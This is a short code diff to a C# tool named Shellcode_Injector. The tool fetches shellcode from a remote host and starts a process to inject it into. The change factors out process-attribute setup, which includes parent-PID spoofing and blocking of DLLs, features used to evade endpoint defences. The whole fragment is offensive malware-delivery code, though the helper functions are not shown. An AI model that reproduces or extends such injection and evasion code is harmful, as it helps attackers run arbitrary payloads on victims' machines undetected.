@@ -15,10 +15,16 @@ namespace Shellcode_Injector
             //Fetch shellcode
             byte[] shellcode = Helpers.Fetch(arguments.shellcode["host"], arguments.shellcode["file"]);
 
+            //Prepare process attributes
+            WinApi.SINEX sin = Helpers.SetAtt(
+                (bool)arguments.process["spoof_ppid"],
+                (bool)arguments.process["block_dlls"],
+                arguments.ppid
+                );
+
             //Create the process that will be injected
             WinApi.PIN pinfo = Helpers.StartS(
-                (bool)arguments.process["spoof_ppid"],
-                arguments.ppid,
+                sin,
                 (string)arguments.process["cmd"],
                 (string)arguments.process["cwd"]
                 );
@@ -64,6 +70,7 @@ namespace Shellcode_Injector
                     Console.WriteLine("Shellcode exec argument have a wrong value");
                     arguments.PrintHelp();
                     break;
+
             }
         }
     }
